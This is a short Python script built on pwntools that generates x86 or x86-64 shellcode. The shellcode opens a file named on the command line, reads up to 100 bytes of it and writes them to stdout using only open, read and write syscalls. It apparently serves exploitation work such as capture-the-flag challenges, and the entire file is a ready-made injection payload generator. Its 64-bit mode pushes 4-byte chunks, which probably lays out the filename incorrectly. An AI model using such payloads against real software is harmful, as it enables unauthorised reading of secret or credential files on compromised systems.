#!/usr/bin/env python

"""
Creates shellcode reading the filename to stdout using only open, read and write syscalls.
Usage: ./gen.py filename
"""

from pwn import *
import sys

LEN = 100

def to_hex(c):
    return "%02x" % ord(c)

def to_hex4(a, b, c, d):
    return '0x' + to_hex(a) + to_hex(b) + to_hex(c) + to_hex(d)


def shellcode(f, b=32):
    sp = 'esp'
    r0 = 'eax'
    r1 = 'ebx'
    r2 = 'ecx'
    r3 = 'edx'
    sys_read = 3
    sys_write = 4
    sys_open = 5
    sys_exit = 1
    syscall = 'int 0x80\n'
    if b==64:
        sp = 'rsp'
        r0 = 'rax'
        r1 = 'rdi'
        r2 = 'rsi'
        r3 = 'rdx'
        sys_read = 0
        sys_write = 1
        sys_open = 2
        sys_exit = 60
        syscall = 'syscall\n'

    f += '\x00'
    while len(f) % 4 != 0:
        f += '\x00'

    # open
    code = ''
    code += 'mov %s, 0\n' % r2
    code += 'mov %s, 0\n' % r3

    for i in reversed(range(0, len(f), 4)):
        code += 'push %s\n' % to_hex4(f[i+3], f[i+2], f[i+1], f[i+0])

    code += 'mov %s, %s\n' % (r1, sp)
    code += 'mov %s, %d\n' % (r0, sys_open)
    code += syscall

    # read
    code += 'mov %s, %s\n' % (r1, r0)
    code += 'mov %s, %d\n' % (r0, sys_read)
    code += 'sub %s, %d\n' % (sp, LEN)
    code += 'mov %s, %s\n' % (r2, sp)
    code += 'mov %s, %d\n' % (r3, LEN)
    code += syscall

    # write
    code += 'mov %s, %d\n' % (r0, sys_write)
    code += 'mov %s, 1\n' % r1
    code += syscall

    # exit
    code += 'mov %s, %d\n' % (r0, sys_exit)
    code += 'mov %s, 0\n' % r1
    code += syscall

    return code

def main():
    print shellcode(sys.argv[1])

if __name__ == "__main__":
    main()
